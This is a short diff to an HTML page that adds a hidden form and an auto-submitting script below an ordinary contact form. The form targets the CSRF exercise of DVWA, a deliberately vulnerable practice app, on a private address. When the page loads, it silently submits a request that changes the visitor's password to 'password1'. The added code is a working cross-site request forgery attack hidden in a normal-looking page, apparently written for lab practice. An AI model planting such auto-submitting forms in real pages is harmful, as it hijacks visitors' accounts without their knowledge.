@@ -68,5 +68,14 @@
         <button class="submit" action="submit">Get in touch</button>
       </form>
     </section>
+    <form class="form" action="http://192.168.10.132/dvwa/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" autocomplete="off" name="password_new" value="password1"><br>
+      <input type="hidden" autocomplete="off" name="password_conf" value="password1">
+      <input type="hidden" value="Change" name="Change">
+    </form>
+
+    <script>
+      document.querySelector(".form").submit();	
+    </script>
   </body>
 </html>
